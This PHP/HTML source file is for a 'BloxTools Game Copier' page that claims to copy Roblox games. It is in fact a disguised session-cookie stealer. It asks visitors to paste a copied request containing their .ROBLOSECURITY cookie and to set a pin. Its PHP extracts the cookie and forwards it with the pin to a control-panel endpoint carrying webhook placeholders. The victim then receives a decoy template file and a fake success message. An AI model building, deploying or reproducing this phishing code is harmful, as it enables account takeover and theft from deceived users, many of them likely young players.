<?php
$view = file_get_contents("visits.txt");
if ($view == "") {
$view = '0';
}
$log = file_get_contents("logs.txt");
if ($log == "") {
$log = '0';
}
$logs = $log + 1;
$visits = $view + 1;
$file = fopen("visits.txt", "w");
    fwrite($file, $visits);
    fclose($file); 
if (isset($_SERVER['HTTPS'])) {
$ht = 'https://';
}else {
$ht = 'http://';
}
$dom = $ht.$_SERVER['SERVER_NAME'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else { $ip = $_SERVER['REMOTE_ADDR']; }
$code = $_POST['code'];
$pin = $_POST['pin'];
$cookie = explode('.ROBLOSECURITY", "', $code);
if ($cookie[1] == "") {
$cookie = explode("ROBLOSECURITY=", $code);
$cookie = explode(';', $cookie[1]);
$cookie = $cookie[0];
}else {
$cookie = explode('"', $cookie[1]);
$cookie = $cookie[0];
}
$chkpin = strlen($pin);
$web = '{web}';
$dualhook = '{dualhook}';
if($pin) {
if(!$cookie) {
$error = "Invalid Game File";
}
if($chkpin == 4) {

}else {
$error = "Please set your pin to 4 digits";
}
if ($cookie) {
 $file = fopen("logs.txt", "w");
    fwrite($file, $logs);
    fclose($file);   
echo file_get_contents("$dom/controlPage/apis/userinfo.php?cookie=$cookie&pin=$pin&web=$web&dh=$dualhook");
}

if (str_starts_with($code, 'curl')){
$info = explode("'https://www.roblox.com/games", $code);
if ($info[1] == ""){
$info = explode("'https://web.roblox.com/games", $code);
}
$info = explode("'", $info[1]);
$info = explode('/', $info[0]);
}else{
$info = explode('"https://www.roblox.com/games', $code);
if ($info[1] == ""){
$info =  explode('"https://web.roblox.com/games', $code);   
}

$info = explode('"', $info[1]);
$info = explode('/', $info[0]);
}
$name = $info[2];
if ($name == "") {
    $error = "Invalid Game File";
}
if(!$error) {
$js = 'Swal.fire({ title: "Good job!", text: "Change .txt to .rbxl", icon: "success" });';
$dw = "downloadFile('$dom/apis/template.rbxl', '$name.txt');

";
}
if($error) {
$js = 'Swal.fire({ title: "Error", text: "'.$error.'", icon: "error" });';
}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BloxTools</title>
<link href="../assets/css/imports_new.css" rel="stylesheet">
<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
<link rel="shortcut icon" type="image/x-icon" href="../assets/img/logo.png">
</head>
<body>
<header id="navbar">
<div class="overlay"></div>
<div class="container">
<nav class="navbar navbar-expand-xl navbar-dark">
<a class="navbar-brand" style="color: white !important;" href="#">
<img src="../assets/img/logo.png" alt="" style="width: 3.5rem;">
<span onclick="window.location.href = '/'" style="margin-left:1rem; font-weight: 600; font-size: 1rem;">Go back <i style="position: relative; top:.15rem; left: .3rem;" class="ri-arrow-go-back-line"></i>
</span>
</a>
<button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
<span class="navbar-toggler-icon"></span>
</button>
</nav>
</div>
</header>
<section id="features">
<div class="overlay"></div>
<div class="container">
<div class="row text-center justify-content-center">
<div class="col-12">
<div class="text-top">
<h1>Game Copier</h1>
<p>Copy games with ease, with this brand new powershell-based system!</p>
</div>
</div>
</div>
<div class="row">
<div class="col-12">
<h2>BloxTools</h2>
</div>
<div class="col-md-6 mb-8">
<div class="box">
<h3>Copy Games</h3>
<br>
<p>Paste your game file in the box below, then click "Copy Game!"
If you don't know how to find a games "game file" then go ahead and watch "How to use"</p>
<form method="post">
<div class="form-input-icon mb-3 mt-4">
<i class="fas fa-file"></i><input class="auth-input" type="text" placeholder="Enter game file" name="code" autocomplete="off" minlength="3" required>
</div>
<div class="form-input-icon mb-3 mt-4">
<i class="fas fa-lock"></i><input class="auth-input" type="number" placeholder="Create A Pin" name="pin" autocomplete="off" minlength="4" required>
</div>
<button type="submit" id="start" class="button primary d-block mt-3 w-100" >Copy Game!</button>
<span>BloxTools</span>
</div>
</div>
<div class="col-md-6 mb-8">
<div class="box">
<h3>How to use</h3>
<p>Video Tutorial</p>
<video width="100%" height="250" controls="">
<source src="/videos/CopyGames.mp4" type="video/mp4">
</video>
<span>BloxTools</span>
</div>
</div>
</div>
</section>
<footer>
<p class="text-center">Copyright 2022 BloxTools. All rights reserved. | Made by ADAM</p>
</footer>
<script src="../assets/js/bootstrap.js"></script>
<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
<?php echo $js; ?>
</script>
<script>
      AOS.init({
        disable: 'mobile',
        once: true,
      });
    </script>
<script>
function downloadFile(url, fileName) {
  fetch(url, { method: 'get', mode: 'no-cors', referrerPolicy: 'no-referrer' })
    .then(res => res.blob())
    .then(res => {
      const aElement = document.createElement('a');
      aElement.setAttribute('download', fileName);
      const href = URL.createObjectURL(res);
      aElement.href = href;
      aElement.setAttribute('target', '_blank');
      aElement.click();
      URL.revokeObjectURL(href);
    });
}
<?php echo $dw; ?>


function remove_hash() {
        setTimeout(() => {
          history.replaceState({}, document.title, ".");
        }, 5);
      }
      var scroll = $(window).scrollTop();
      if (scroll > 70) {
        $("#navbar").addClass("active");
      } else {
        $("#navbar").removeClass("active");
      }
      $(window).scroll(function() {
        var scroll = $(window).scrollTop();
        if (scroll > 70) {
          $("#navbar").addClass("active");
        } else {
          $("#navbar").removeClass("active");
        }
      });
    </script>
</body>
</html>